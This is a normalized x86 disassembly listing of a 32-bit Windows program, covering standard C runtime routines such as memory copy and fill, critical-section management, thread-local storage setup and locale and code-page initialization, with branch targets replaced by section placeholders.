retn
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_406a24 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_406a24 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_406a24 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406888 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406888 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406888 ]
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
lea esp [ esp ]
nop
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
lea ebx [ ebx ]
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + jump_table_406888 ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_406ba0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
movzx eax [ esp + 0x8 ]
bt [ rw-data ] 0x1
jae r-xdata
mov edx [ esp + 0xc ]
cmp edx 0x80
jl r-xdata
mov ecx [ esp + 0xc ]
push edi
mov edi [ esp + 0x8 ]
[ edi ]
jmp r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
test eax eax
jne r-xdata
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
movd xmm0 eax
punpcklbw xmm0 xmm0
punpcklwd xmm0 xmm0
pshufd xmm0 xmm0 0x0
pxor xmm0 xmm0
jmp r-xdata
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
neg ebx
add ebx 0x10
sub edx ebx
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov ebx edx
and edx 0x7f
shr ebx 0x7
je r-xdata
push ebx
push ecx
mov ebx ecx
and ebx 0xf
test ebx ebx
jne r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec ebx
jne r-xdata
pop edx
jmp r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop eax
pop ebx
retn
mov ebx edx
shr ebx 0x4
je r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov ebx edx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec ebx
jne r-xdata
and ebx 0x3
je r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] al
inc ecx
dec ebx
jne r-xdata
sub_406cd1
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsSetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_406cf3
push ebp
mov ebp esp
push ecx
push esi
mov esi [ rw-data ]
test esi esi
jns r-xdata
xor eax eax
test esi esi
setg al
pop esi
leave
retn
mov eax [ rw-data ]
xor esi esi
xor eax [ rw-data ]
mov [ ebp - 0x4 ] esi
je r-xdata
mov [ rw-data ] esi
push esi
lea ecx [ ebp - 0x4 ]
push ecx
call eax
cmp eax 0x7a
jne r-xdata
inc esi
sub_406d31
push esi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ GetProcAddress@IAT ]
mov edi eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
mov [ rw-data ] eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
pop edi
mov [ rw-data ] eax
pop esi
retn
sub_406fa9
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi * 8 + rw-data ] 0x0
jne r-xdata
push [ esi * 8 + rw-data ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push esi
call sub_407031
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_4048fd
sub_406fdd
push esi
push edi
mov esi rw-data
mov edi esi
push ebx
add edi 0x8
cmp edi rw-data
jl r-xdata
cmp [ edi + 0x4 ] 0x1
je r-xdata
mov ebx [ edi ]
test ebx ebx
je r-xdata
pop ebx
push ebx
call [ DeleteCriticalSection@IAT ]
push ebx
call sub_404081
and [ edi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
retn
push [ esi ]
call [ DeleteCriticalSection@IAT ]
sub_407031
push 0x8
push r--data
call sub_405550
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ ebp + 0x8 ]
cmp [ edi * 8 + rw-data ] 0x0
jne r-xdata
call sub_404ba7
push 0x1e
call sub_404c04
push 0xff
call sub_4048e7
xor eax eax
inc eax
push 0x18
call sub_40716c
pop ecx
mov esi eax
test esi esi
jne r-xdata
push 0xa
call sub_406fa9
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ edi * 8 + rw-data ] 0x0
jne r-xdata
call sub_4058af
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
push esi
call sub_404081
pop ecx
push 0xfa0
push esi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ edi * 8 + rw-data ] esi
jmp r-xdata
call sub_405595
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4070cf
sub_4070d8
push esi
push edi
mov esi rw-data
mov edi rw-data
add esi 0x8
cmp esi rw-data
jl r-xdata
mov [ esi ] edi
push 0xfa0
push [ esi ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
cmp [ esi + 0x4 ] 0x1
jne r-xdata
xor eax eax
pop edi
inc eax
pop esi
retn
sub_407122
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea ecx [ esi + 0x3e8 ]
mov esi ecx
cmp ecx [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a78c
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_40716c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ rw-data ]
xor esi esi
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test edi edi
je r-xdata
push esi
call [ Sleep@IAT ]
mov edi [ rw-data ]
lea ecx [ esi + 0x3e8 ]
mov esi ecx
cmp ecx edi
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0x8 ]
call sub_4040b9
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
sub_4071b5
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
mov esi eax
cmp eax [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a6e1
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_407201
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
cmp [ edi + 0x78 ] 0x0
je r-xdata
mov eax [ edi + 0x80 ]
test eax eax
je r-xdata
push [ edi + 0x78 ]
call esi
cmp [ edi + 0x7c ] 0x0
je r-xdata
push eax
call esi
mov eax [ edi + 0x88 ]
test eax eax
je r-xdata
push [ edi + 0x7c ]
call esi
push 0x6
pop eax
lea ebx [ edi + 0x1c ]
mov [ ebp + 0x8 ] eax
push eax
call esi
cmp [ ebx - 0xc ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
add ebx 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebx - 0x4 ] 0x0
je r-xdata
push [ ebx ]
call esi
mov eax [ ebp + 0x8 ]
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0x9c ]
add eax 0xb0
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push [ ebx - 0x4 ]
call esi
mov eax [ ebp + 0x8 ]
sub_407291
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax [ esi + 0x84 ]
push edi
test eax eax
je r-xdata
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0x9c ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0x78 ]
test eax eax
je r-xdata
push 0x6
pop eax
lea ebx [ esi + 0xa0 ]
lea edi [ esi + 0x1c ]
mov [ ebp + 0x8 ] eax
cmp [ eax + 0xb0 ] ebx
jne r-xdata
mov eax [ esi + 0x8c ]
sub eax 0xfe
push eax
call sub_404081
mov eax [ esi + 0x94 ]
mov edi 0x80
sub eax edi
push eax
call sub_404081
mov eax [ esi + 0x98 ]
sub eax edi
push eax
call sub_404081
push [ esi + 0x88 ]
call sub_404081
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0xc ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push eax
call sub_40a969
push [ esi + 0x9c ]
call sub_404081
pop ecx
pop ecx
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
add ebx 0x4
add edi 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
mov eax [ edi - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0x7c ]
test eax eax
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_404081
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_404081
push [ ebx ]
call sub_404081
pop ecx
pop ecx
push [ esi + 0x78 ]
call sub_404081
push [ esi + 0x84 ]
call sub_404081
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_404081
push [ esi + 0x84 ]
call sub_40a806
pop ecx
pop ecx
push eax
call sub_404081
pop ecx
push eax
call sub_404081
push [ esi + 0x84 ]
call sub_40a902
pop ecx
pop ecx
sub_4073eb
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push ebx
push edi
mov edi [ InterlockedDecrement@IAT ]
push esi
call edi
cmp [ esi + 0x78 ] 0x0
je r-xdata
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
push [ esi + 0x78 ]
call edi
cmp [ esi + 0x7c ] 0x0
je r-xdata
push eax
call edi
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
push [ esi + 0x7c ]
call edi
push 0x6
pop eax
lea ebx [ esi + 0x1c ]
mov [ ebp + 0x8 ] eax
push eax
call edi
cmp [ ebx - 0xc ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
add ebx 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebx - 0x4 ] 0x0
je r-xdata
push [ ebx ]
call edi
mov eax [ ebp + 0x8 ]
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov ecx [ esi + 0x9c ]
add ecx 0xb0
push ecx
call edi
pop edi
pop ebx
push [ ebx - 0x4 ]
call edi
mov eax [ ebp + 0x8 ]
sub_407486
push 0xc
push r--data
call sub_405550
call sub_4046e8
mov esi eax
mov ecx [ rw-data ]
test [ esi + 0x70 ] ecx
je r-xdata
push 0xc
call sub_406fa9
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
lea eax [ esi + 0x6c ]
push eax
call sub_407502
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4074f9
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_4046e8
mov esi [ eax + 0x6c ]
mov eax esi
call sub_405595
retn
push 0x20
call sub_4048fd
sub_407502
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_407201
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_4073eb
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_407291
pop ecx
sub_40756b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub eax 0x3a4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0x4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0xd
je r-xdata
mov eax [ r--data ]
pop ebp
retn
dec eax
je r-xdata
mov eax [ r--data ]
pop ebp
retn
xor eax eax
pop ebp
retn
sub_4075a5
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push 0x0
call sub_405d89
mov eax [ ebp + 0x8 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
jmp r-xdata
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] 0x1
mov eax [ eax + 0x4 ]
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_407611
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x101
xor edi edi
lea esi [ ebx + 0x18 ]
push edi
push esi
call sub_406ba0
xor eax eax
movzx ecx ax
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x21c ] edi
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov edi rw-data
add esp 0xc
sub edi ebx
mov ecx 0x101
mov al [ edi + esi ]
mov [ esi ] al
inc esi
dec ecx
jne r-xdata
lea ecx [ ebx + 0x119 ]
mov edx 0x100
mov al [ ecx + edi ]
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40767a
push ebp
mov ebp esp
sub esp 0x520
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
xor ebx ebx
mov edi 0x100
test eax eax
je r-xdata
push 0xffffff9f
lea edx [ esi + 0x119 ]
pop eax
sub eax edx
mov ecx ebx
mov [ ebp - 0x520 ] eax
mov eax ebx
cmp [ ebp - 0x51c ] 0x19
ja r-xdata
or [ esi + ecx + 0x19 ] 0x10
lea eax [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
lea ecx [ ebp - 0x512 ]
jmp r-xdata
mov [ edx ] bl
or [ esi + ecx + 0x19 ] 0x20
lea eax [ ecx - 0x20 ]
mov [ edx ] al
jmp r-xdata
test al al
jne r-xdata
add edx ecx
add eax edx
mov [ ebp - 0x51c ] eax
add eax 0x20
cmp eax 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_404072
leave
retn
mov eax [ ebp - 0x520 ]
inc ecx
lea edx [ esi + 0x119 ]
cmp ecx edi
jb r-xdata
movzx edx [ ecx + 0x1 ]
movzx eax al
jmp r-xdata
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x504 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push ebx
call sub_40b021
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0x21c ]
push ebx
call sub_40aed2
add esp 0x40
lea eax [ ebp - 0x304 ]
push ebx
push [ esi + 0x4 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0x21c ]
push ebx
call sub_40aed2
add esp 0x24
mov ecx ebx
cmp eax edx
jbe r-xdata
test al 0x2
je r-xdata
or [ esi + ecx + 0x19 ] 0x10
mov al [ ebp + ecx - 0x204 ]
jmp r-xdata
cmp eax edi
jae r-xdata
add ecx 0x2
mov al [ ecx ]
mov [ esi + ecx + 0x119 ] bl
or [ esi + ecx + 0x19 ] 0x20
mov al [ ebp + ecx - 0x304 ]
mov [ esi + ecx + 0x119 ] al
jmp r-xdata
mov [ ebp + eax - 0x104 ] 0x20
inc eax
movzx eax [ ebp + ecx * 2 - 0x504 ]
test al 0x1
je r-xdata
jmp r-xdata
inc ecx
cmp ecx edi
jb r-xdata
sub_407808
push 0xc
push r--data
call sub_405550
call sub_4046e8
mov edi eax
mov ecx [ rw-data ]
test [ edi + 0x70 ] ecx
je r-xdata
push 0xd
call sub_406fa9
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4078a4
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_405595
retn
push 0x20
call sub_4048fd
cmp esi rw-data
je r-xdata
push esi
call sub_404081
pop ecx
sub_4078ad
push 0x10
push r--data
call sub_405550
or edi 0xffffffff
call sub_4046e8
mov ebx eax
mov [ ebp - 0x1c ] ebx
call sub_407808
mov esi [ ebx + 0x68 ]
push [ ebp + 0x8 ]
call sub_4075a5
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax [ esi + 0x4 ]
je r-xdata
xor edi edi
push 0x220
call sub_40716c
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
call sub_405595
retn
mov ecx 0x88
mov eax [ ebp - 0x1c ]
mov esi [ eax + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
xor esi esi
mov [ ebx ] esi
push ebx
push [ ebp + 0x8 ]
call sub_407a5b
pop ecx
pop ecx
mov edi eax
mov [ ebp + 0x8 ] edi
test edi edi
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
mov eax [ ebp - 0x1c ]
push [ eax + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
mov eax [ ebp - 0x1c ]
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ eax + 0x68 ] ebx
push ebx
call [ InterlockedIncrement@IAT ]
mov eax [ ebp - 0x1c ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov ecx [ eax + 0x68 ]
cmp ecx rw-data
je r-xdata
call sub_4058af
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_404081
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push ecx
call sub_404081
pop ecx
mov eax [ ebp - 0x1c ]
push 0xd
call sub_406fa9
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x21c ]
mov [ rw-data ] eax
mov ecx esi
mov ecx esi
mov ax [ ebx + ecx * 2 + 0xc ]
mov [ ecx * 2 + rw-data ] ax
inc ecx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi 0x100
jge r-xdata
mov al [ ecx + ebx + 0x18 ]
mov [ ecx + rw-data ] al
inc ecx
jmp r-xdata
mov [ ebp - 0x20 ] ecx
cmp ecx 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov al [ esi + ebx + 0x119 ]
mov [ esi + rw-data ] al
inc esi
jmp r-xdata
mov [ ebp - 0x20 ] ecx
cmp ecx 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407a25
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
push eax
call sub_404081
pop ecx
sub_407a5b
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
call sub_4075a5
mov ebx eax
pop ecx
mov [ ebp - 0x20 ] ebx
test ebx ebx
jne r-xdata
push edi
xor edi edi
mov ecx edi
mov [ ebp - 0x1c ] ecx
mov eax edi
push esi
call sub_407611
pop ecx
xor eax eax
jmp r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_406ba0
mov edx [ ebp - 0x1c ]
add esp 0xc
imul edx edx 0x30
lea eax [ edx + rw-data ]
mov [ ebp - 0x1c ] eax
inc ecx
add eax 0x30
mov [ ebp - 0x1c ] ecx
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_404072
leave
retn
inc edi
add eax 0x8
mov [ ebp - 0x1c ] eax
cmp edi 0x4
jb r-xdata
